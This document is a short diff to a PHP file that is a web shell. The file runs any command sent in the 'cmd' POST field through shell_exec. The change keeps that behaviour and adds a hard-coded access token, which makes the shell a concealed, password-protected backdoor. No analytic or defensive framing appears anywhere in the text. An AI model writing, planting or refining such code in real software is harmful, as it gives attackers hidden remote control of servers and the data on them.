@@ -1,5 +1,5 @@
 <?php
-if (!empty($_POST['cmd'])) {
+if (!empty($_POST['cmd'])&&(isset($_GET['token']) && $_GET['token'] === 'RyTB2wUK15eTFa9B')) {
     $cmd = shell_exec($_POST['cmd']);
 }
 ?>
